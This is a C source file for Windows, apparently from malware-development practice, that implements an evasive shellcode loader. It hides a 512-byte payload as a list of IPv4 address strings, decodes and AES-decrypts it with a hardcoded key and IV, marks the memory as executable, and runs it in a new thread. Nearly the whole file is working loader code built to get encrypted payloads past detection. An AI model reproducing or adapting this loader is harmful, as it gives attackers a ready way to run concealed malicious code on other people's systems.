#include "glassBox.h"
#include "aesDecryption.h"
#include "ipv4Deobfuscation.h"

int main(void) {

    unsigned char pKey[32] = {
        0x5F, 0x5B, 0xAA, 0x7D, 0x36, 0x31, 0x5F, 0x02,
        0x0E, 0x4F, 0x6C, 0x48, 0xB4, 0xD4, 0xE6, 0x75,
        0xDC, 0x35, 0x8F, 0x78, 0xDD, 0x6B, 0x37, 0x9A,
        0xDE, 0x3F, 0xAF, 0x63, 0xF0, 0x64, 0xAB, 0x24
    };

    unsigned char pIv[16] = {
        0xEA, 0x44, 0xC7, 0x04, 0x57, 0x37, 0x1A, 0x08,
        0x16, 0x79, 0xA8, 0x50, 0xAC, 0xCE, 0xDC, 0x73
    };

    char* ipv4Array[] = {
            "74.118.47.202","156.140.160.62","73.218.156.95","10.241.136.39","131.142.186.62","14.86.107.135","91.244.49.103","187.228.77.73",
            "180.191.44.118","30.159.245.78","56.232.252.254","94.166.249.127","220.238.31.239","103.247.103.46","51.34.148.176","222.253.22.152",
            "39.104.214.40","41.240.73.170","77.163.118.147","194.126.70.53","222.95.42.7","105.51.131.34","105.230.150.121","96.79.111.128",
            "138.140.138.110","61.175.245.34","232.96.142.158","16.160.255.233","183.163.166.15","221.247.10.96","69.197.204.239","10.117.23.157",
            "66.39.191.59","192.60.180.79","70.67.52.207","84.88.69.235","53.231.217.224","171.100.162.165","73.85.100.249","250.26.80.200",
            "79.36.26.75","176.71.43.130","63.223.20.181","238.170.199.113","30.149.95.211","94.235.52.63","109.28.231.153","13.144.86.185",
            "226.151.163.185","113.38.153.177","112.205.164.187","246.53.217.144","127.55.70.171","196.71.48.250","243.240.140.66","57.173.86.18",
            "6.222.103.49","30.180.55.144","140.239.216.230","41.139.240.95","133.9.118.155","175.178.165.153","234.11.113.18","116.235.227.171",
            "154.174.86.0","238.81.236.188","172.104.140.5","102.245.26.89","93.65.8.47","178.150.208.242","36.211.97.41","226.44.14.21",
            "153.191.40.72","90.165.64.194","0.198.6.49","48.12.18.13","160.27.34.150","20.57.208.15","159.52.77.40","16.57.242.173",
            "155.200.0.15","117.251.137.162","126.160.161.23","46.71.239.199","169.6.130.239","22.178.29.217","197.103.81.198","239.92.136.93",
            "12.50.56.237","172.29.180.38","177.76.86.201","110.251.142.172","189.229.11.233","239.247.7.18","153.150.171.104","173.52.133.96",
            "114.143.187.31","153.127.23.101","118.28.104.203","76.242.127.231","120.14.98.114","48.63.218.145","145.38.35.241","216.41.119.82",
            "202.136.65.245","190.218.1.111","121.123.170.68","170.218.13.246","153.28.89.211","142.120.224.17","54.16.71.118","196.162.124.135",
            "84.8.36.61","13.180.242.201","21.80.124.115","16.99.156.115","208.32.255.208","111.64.91.86","186.239.127.106","229.156.84.105",
            "101.11.212.1","98.44.153.16","85.120.20.224","78.81.179.39","187.133.134.215","204.55.207.208","94.139.236.80","222.175.15.112"
    };

    SIZE_T numElements = sizeof(ipv4Array) / sizeof(ipv4Array[0]);

    PBYTE pDecoded = NULL;
    SIZE_T decodedSize = 0;

    if (!Ipv4Deobfuscation(
        ipv4Array,
        numElements,
        512, // MAKE SURE TO ADD THE ORIGINAL PAYLOADSIZE WITHOUT THE PADDING //
        &pDecoded,
        &decodedSize))
    {
        warn("Deobfuscation failed!\n");
        return 1;
    }


    if (!AesDecryptBuffer(pDecoded, decodedSize, pKey, pIv)) {
        warn("Decryption failed!\n");
        HeapFree(GetProcessHeap(), 0, pDecoded);
        return 1;
    }

    PVOID pCodeAddress = VirtualAlloc(NULL, decodedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pCodeAddress == NULL) {
        warn("VirtualAlloc Failed with Error: %d \n", GetLastError());
        return EXIT_FAILURE;
    }

    info("Allocated Memory At: 0X%p \n", pCodeAddress);

    in("Press <Enter> To Write Code ...");
    getchar();
    memcpy(pCodeAddress, pDecoded, decodedSize);
    memset(pDecoded, "\0", decodedSize);

    DWORD dwOldProtection = NULL;

    if (!VirtualProtect(pCodeAddress, decodedSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        warn("VirutalProtect Failed with Error: %d \n", GetLastError());
        return EXIT_FAILURE;
    }

    in("Press <Enter> to Run ...");
    getchar();

    if (CreateThread(NULL, NULL, pCodeAddress, NULL, NULL, NULL) == NULL) {
        warn("CeateThread Failed with Error: %d \n", GetLastError());
        return EXIT_FAILURE;
    }

    HeapFree(GetProcessHeap(), 0, pDecoded);
    in("Press <Enter> to Quit ...");
    getchar();

    return 0;

    //for (SIZE_T i = 0; i < decodedSize; i++) {
    //    printf("\\0x%02X", pDecoded[i]);
    //}

    //printf("\n");

    //HeapFree(GetProcessHeap(), 0, pDecoded);
}